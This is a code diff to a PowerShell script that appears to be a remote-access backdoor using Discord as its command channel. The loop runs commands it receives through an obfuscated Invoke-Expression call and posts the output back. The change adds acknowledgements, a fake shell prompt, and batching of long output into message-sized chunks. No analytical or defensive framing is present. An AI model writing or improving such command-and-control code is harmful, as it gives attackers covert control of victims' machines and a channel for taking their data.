@@ -1343,13 +1343,35 @@ while($true){
                 WaitingMsg
             }
             elseif (!($response -like "$previouscmd")) {
-                $Result=ie`x($response) -ErrorAction Stop
-                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")){
+                $Result = ie`x($response) -ErrorAction Stop
+                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
                     $script:previouscmd = $response
+                    sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
+                    sleep -m 250
+                    sendMsg -Message "``PS | $dir>``"
                 }
-                else{
+                else {
                     $script:previouscmd = $response
-                    sendMsg -Message "``````$Result``````"
+                    $resultLines = $Result -split "`n"
+                    $maxBatchSize = 1900
+                    $currentBatchSize = 0
+                    $batch = @()
+                    foreach ($line in $resultLines) {
+                        $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
+                        if (($currentBatchSize + $lineSize) -gt $maxBatchSize) {
+                            sendMsg -Message "``````$($batch -join "`n")``````"
+                            sleep -m 400
+                            $currentBatchSize = 0
+                            $batch = @()
+                        }
+                        $batch += $line
+                        $currentBatchSize += $lineSize
+                    }
+                    if ($batch.Count -gt 0) {
+                        sendMsg -Message "``````$($batch -join "`n")``````"
+                        sleep -m 250
+                    }
+                    sendMsg -Message "``PS | $dir>``"
                 }
             }
         }
